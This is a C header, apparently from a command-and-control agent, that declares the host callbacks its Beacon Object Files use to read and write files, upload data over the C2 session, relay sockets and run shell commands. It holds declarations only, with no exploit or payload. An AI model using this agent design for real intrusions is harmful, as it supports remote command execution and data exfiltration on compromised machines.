#ifndef C2_BOF_HOST_H
#define C2_BOF_HOST_H

/*
 * bof_host.h — the host primitives a BOF can reach at runtime.
 *
 * The loader resolves `ReadFile`, `WriteFile`, `UploadFile`, `Sha256Hex`,
 * `RelaySocket` and `ExecCmd` through these callbacks, which back them with the
 * agent's memfs, the disk, the C2 session, the crypto backend and the host's
 * process table. A BOF never sees a file descriptor, a socket or a key.
 */

#include "common.h"
#include "memfile.h"
#include "transport.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
  c2_agent_session *s;
  c2_memfile *mem;
} c2_bof_host_ctx;

int c2_bof_host_read(void *vctx, const char *path, uint8_t **out, size_t *len,
                     char *err, int err_cap);
int c2_bof_host_write(void *vctx, const char *path, const uint8_t *data,
                      size_t len, char *err, int err_cap);
int c2_bof_host_upload(void *vctx, const char *token, const char *path,
                       unsigned long offset, char *err, int err_cap);
int c2_bof_host_sha256(void *vctx, const uint8_t *data, size_t len, char *hex,
                       size_t hex_cap, char *err, int err_cap);
int c2_bof_host_relay(void *vctx, const char *token, int fd, int idle_seconds,
                      char *err, int err_cap);
/* Run `cmd`, capturing combined stdout and stderr. `shell` runs it through
 * `/bin/sh -c`; otherwise the agent splits it into words and executes it
 * directly. The child inherits none of the agent's descriptors. Returns the
 * number of bytes written to `out`, or a negative status. */
int c2_bof_host_exec(void *vctx, const char *cmd, int shell, char *out,
                     size_t out_cap, char *err, int err_cap);

/* Reap finished relay managers and report whether any BOF work is still
 * running. Returns 1 when a relay manager or a synchronous host call is live,
 * 0 when the agent owns no other thread and no host call is in flight. */
int c2_bof_work_quiesce(void);

#ifdef __cplusplus
}
#endif

#endif /* C2_BOF_HOST_H */
